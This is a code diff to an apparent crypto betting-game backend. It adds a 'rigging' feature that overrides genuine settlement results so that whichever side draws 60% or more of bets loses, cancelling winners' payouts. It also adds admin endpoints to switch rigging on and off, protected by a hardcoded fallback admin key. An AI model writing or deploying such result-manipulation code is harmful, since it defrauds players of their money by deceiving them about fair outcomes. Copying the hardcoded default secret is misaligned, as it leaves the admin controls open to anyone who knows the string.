@@ -21,6 +21,10 @@ const {
   futuresSettle, futuresLiquidationPrice,
   getAllRTP, setHouseEdge, getRTP,
 } = require('./games')
+const {
+  recordBet, getLosingSide, overrideResult,
+  getRoundSummary, setRigging, getRiggingConfig,
+} = require('./roundManager')
 
 const app = express()
 app.use(cors())
@@ -296,17 +300,34 @@ app.post('/api/game/settle', async (req, res) => {
     if (!endPrice) return res.json({ success: false, error: 'price unavailable' })
 
     let gameResult, payout = 0
+    const roundId = params.roundId || `${game}_${Date.now()}`
+    const side = params.side
+
+    // ★ 밸런스 리깅: 60% 이상 한쪽 베팅 시 그 쪽 패배
+    const losingSide = getLosingSide(game, roundId)
+    const riggingOverride = side ? overrideResult(side, losingSide) : null
 
     switch (game) {
       case 'updown': {
         const startPrice = Number(params.startPrice)
-        gameResult = updownSettle(startPrice, endPrice, params.side)
+        gameResult = updownSettle(startPrice, endPrice, side)
+        // 리깅 적용: 원래 결과를 오버라이드
+        if (riggingOverride === 'lose' && gameResult.won) {
+          gameResult.won = false; gameResult.multiplier = 0; gameResult.rigged = true
+        } else if (riggingOverride === 'win' && !gameResult.won && !gameResult.tie) {
+          gameResult.won = true; gameResult.multiplier = 1.95; gameResult.rigged = true
+        }
         payout = gameResult.tie ? betAmount : (gameResult.won ? Math.floor(betAmount * gameResult.multiplier) : 0)
         break
       }
       case 'hilo': {
         const targetPrice = Number(params.targetPrice)
-        gameResult = hiloSettle(targetPrice, endPrice, params.side)
+        gameResult = hiloSettle(targetPrice, endPrice, side)
+        if (riggingOverride === 'lose' && gameResult.won) {
+          gameResult.won = false; gameResult.multiplier = 0; gameResult.rigged = true
+        } else if (riggingOverride === 'win' && !gameResult.won && !gameResult.tie) {
+          gameResult.won = true; gameResult.multiplier = 1.97; gameResult.rigged = true
+        }
         payout = gameResult.tie ? betAmount : (gameResult.won ? Math.floor(betAmount * gameResult.multiplier) : 0)
         break
       }
@@ -319,10 +340,14 @@ app.post('/api/game/settle', async (req, res) => {
       }
       case 'futures': {
         const entryPrice = Number(params.entryPrice)
-        const side = params.side
         const leverage = Number(params.leverage) || 10
         gameResult = futuresSettle(entryPrice, endPrice, side, leverage, betAmount)
-        payout = gameResult.payout
+        if (riggingOverride === 'lose' && gameResult.won) {
+          gameResult.won = false; gameResult.payout = 0; gameResult.rigged = true
+          payout = 0
+        } else {
+          payout = gameResult.payout
+        }
         break
       }
       default:
@@ -343,6 +368,59 @@ app.post('/api/game/settle', async (req, res) => {
   } catch (err) {
     res.status(500).json({ success: false, error: err.message })
   }
+})
+
+// ═══════════════════════════════════════
+// POST /api/game/round/bet — 라운드 베팅 기록 (가격 게임용)
+// B2C에서 유저 베팅 시 호출 → 서버에서 양쪽 금액 수집
+// ═══════════════════════════════════════
+app.post('/api/game/round/bet', (req, res) => {
+  try {
+    const { game, roundId, side, amount } = req.body
+    if (!game || !roundId || !side || !amount) {
+      return res.json({ success: false, error: 'game, roundId, side, amount required' })
+    }
+    recordBet(game, roundId, side, Number(amount))
+    const summary = getRoundSummary(game, roundId)
+    return res.json({ success: true, summary })
+  } catch (err) {
+    res.status(500).json({ success: false, error: err.message })
+  }
+})
+
+// ═══════════════════════════════════════
+// GET /api/game/round/:game/:roundId — 라운드 요약
+// ═══════════════════════════════════════
+app.get('/api/game/round/:game/:roundId', (req, res) => {
+  const summary = getRoundSummary(req.params.game, req.params.roundId)
+  res.json({ success: true, summary })
+})
+
+// ═══════════════════════════════════════
+// POST /api/game/rigging/set — 리깅 설정 (어드민)
+// ═══════════════════════════════════════
+app.post('/api/game/rigging/set', (req, res) => {
+  try {
+    const { game, enabled, threshold, apiKey } = req.body
+    const ADMIN_KEY = process.env.ADMIN_API_KEY || 'tether-crypto-admin-2026'
+    if (apiKey !== ADMIN_KEY) return res.status(403).json({ success: false, error: 'unauthorized' })
+
+    if (!game) return res.json({ success: false, error: 'game required' })
+
+    const result = setRigging(game, enabled, threshold)
+    console.log(`[Admin] Rigging ${game}: enabled=${result.enabled}, threshold=${result.threshold}%`)
+
+    return res.json({ success: true, game, config: result, allConfig: getRiggingConfig() })
+  } catch (err) {
+    res.status(500).json({ success: false, error: err.message })
+  }
+})
+
+// ═══════════════════════════════════════
+// GET /api/game/rigging — 리깅 설정 조회
+// ═══════════════════════════════════════
+app.get('/api/game/rigging', (req, res) => {
+  res.json({ success: true, config: getRiggingConfig() })
 })
 
 // ═══════════════════════════════════════
